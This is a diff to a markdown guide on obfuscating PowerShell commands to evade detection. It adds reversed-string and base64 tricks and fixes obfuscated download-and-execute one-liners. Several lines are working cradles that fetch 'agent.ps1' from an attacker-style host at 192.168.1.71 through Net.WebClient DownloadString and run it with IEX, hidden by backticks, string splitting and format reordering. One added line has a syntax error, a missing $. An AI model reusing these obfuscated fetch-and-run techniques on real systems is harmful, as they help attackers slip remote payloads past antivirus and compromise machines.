@@ -320,8 +320,8 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - String obfuscated<br />
 
-      $get="N`et.Web`Cli`ent"              <-- caret ` inside double quotes
-      $Dow='Do'+'wn'+'loa'+'dStri'+'ng'    <-- caret + inside single quotes
+      $get="N`et.Web`Cli`ent";              <-- caret ` inside double quotes
+      $Dow='Do'+'wn'+'loa'+'dStri'+'ng';    <-- caret + inside single quotes
       powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
 
 ![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)
@@ -349,6 +349,18 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       text alignment from left to rigth side (arabe alignment). That built-in feature allow us
       to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at runtime.
 
+<br />
+
+      [Using ::Reverse Switch]
+      $reverseCmd='etaD.teG exe.llehsrewop';
+      $reverseCmdCharArray= $reverseCmd.ToCharArray();[Array]::Reverse($reverseCmdCharArray);
+      (ReverseCmdCharArray-Join '') | IEX
+
+      [Using Regex]
+      $reverseCmd='etaD.teG exe.llehsrewop';
+      IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX
+
+
 ![powershell obfuscation](http://i.cubeupload.com/yukEB8.jpg)
 
 ---
@@ -372,7 +384,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 - Another way to use **splatting + reorder** technic to remote download/execute agent
 
-      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Downnload','http://','lie') | I`EX
+      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Download','http://','lie') | I`EX
 
 ![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)
 
@@ -396,8 +408,8 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
       3º - Insert the follow lines into your powershell script
 
-        $base64string='R2V0LURhdGUK'
-        $decoded = 'powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""$base64string"""^)^)'
+        $base64string='R2V0LURhdGUK';
+        $decoded = 'powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""$base64string"""^)^)';
         powershell.exe $decoded   #<-- execute/decode the base64 syscall at runtime
 
 ![powershell obfuscation](http://i.)
